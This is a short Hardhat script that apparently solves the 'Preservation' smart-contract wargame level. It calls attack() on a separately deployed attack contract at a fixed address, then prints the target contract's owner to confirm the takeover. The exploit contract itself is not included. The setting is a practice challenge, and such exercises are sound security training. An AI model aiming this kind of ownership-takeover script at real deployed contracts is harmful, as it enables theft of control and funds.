import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x8E8A3c0547c9A17F051D2E5CAf7E0e21C0719E1C"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xF11AdF603fCB526239394332358e3EC02ad52fB8"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("PreservationAttack", ATTACK_ADDRESS, signer)

  await attackContract.attack()

  console.log(await contract.owner())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
